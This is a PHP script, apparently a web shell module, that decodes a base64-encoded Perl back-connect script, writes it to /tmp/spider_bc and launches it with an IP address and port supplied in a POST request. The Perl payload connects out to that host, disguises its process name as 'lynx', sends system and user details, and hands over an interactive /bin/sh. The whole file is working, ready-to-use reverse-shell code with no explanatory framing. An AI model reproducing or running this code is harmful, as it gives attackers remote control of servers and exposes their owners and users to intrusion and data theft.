<?php
function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	return $res;
}


$back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
			"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
			"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
			"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '创建/tmp/spider_bc成功<br>' : '创建/tmp/spider_bc失败<br>';
$perlpath = Exec_Run('which perl');
$perlpath = chop($perlpath);
echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &');
			
		
?>